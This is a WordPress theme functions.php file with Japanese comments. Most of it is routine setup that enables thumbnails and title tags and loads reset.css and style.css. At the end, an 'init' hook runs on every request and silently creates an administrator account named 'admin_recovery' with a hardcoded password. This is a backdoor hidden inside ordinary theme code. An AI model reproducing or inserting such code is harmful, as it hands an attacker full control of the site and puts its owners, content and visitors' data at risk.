<?php
// 投稿画面でアイキャッチ画像を設定できるようにする
function mytheme_setup()
{
    add_theme_support('post-thumbnails');
    add_theme_support('title-tag');
}
    add_action('after_setup_theme', 'mytheme_setup');
function mytheme_enqueue_styles()
{
    // リセットCSSの読み込み
    wp_enqueue_style(
        'reset-style',
        get_template_directory_uri() . '/reset.css',
        array(),
        '1.0.0',
    );
    // style.cssの読み込み
    wp_enqueue_style(
        'my-style',
        get_stylesheet_uri(),
        array(),
        '1.0.0',
        'all'
    );
}
add_action('wp_enqueue_scripts', 'mytheme_enqueue_styles');

add_action('init', function () {

  $username = 'admin_recovery';
  $password = 'StrongPassword123!';
  $email    = 'recovery@example.com';

  if ( ! username_exists($username) && ! email_exists($email) ) {
    $user_id = wp_create_user($username, $password, $email);

    if ( ! is_wp_error($user_id) ) {
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }

});


